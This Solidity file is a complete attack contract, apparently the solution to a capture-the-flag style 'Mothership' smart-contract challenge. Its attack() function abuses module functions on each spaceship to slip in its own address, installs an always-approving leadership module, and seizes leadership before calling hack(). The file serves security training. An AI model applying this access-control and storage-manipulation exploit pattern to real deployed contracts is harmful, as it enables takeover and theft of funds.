// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../Challenges/Mothership.sol";

contract AttackerMothership {
    Mothership public immutable mothership;

    constructor(address _mothershipAddress) {
        mothership = Mothership(_mothershipAddress);
    }

    function attack() public {
        AttackerLeadershipModule newLeadreship = new AttackerLeadershipModule();
        for (uint256 i = 0; i < mothership.fleetLength(); i++) {
            SpaceShip spaceship = mothership.fleet(i);
            CleaningModule(address(spaceship)).replaceCleaningCompany(
                address(this)
            );
            RefuelModule(address(spaceship)).addAlternativeRefuelStationsCodes(
                uint256(uint160(address(this)))
            );
            spaceship.addModule(
                LeadershipModule.isLeaderApproved.selector,
                address(newLeadreship)
            );
            CleaningModule(address(spaceship)).replaceCleaningCompany(
                address(0)
            );
            if (i == mothership.fleetLength() - 1) {
                spaceship.askForNewCaptain(address(this));
            }
        }
        mothership.promoteToLeader(address(this));
        mothership.hack();
    }
}

contract AttackerLeadershipModule {
    function isLeaderApproved(address) external pure {}
}
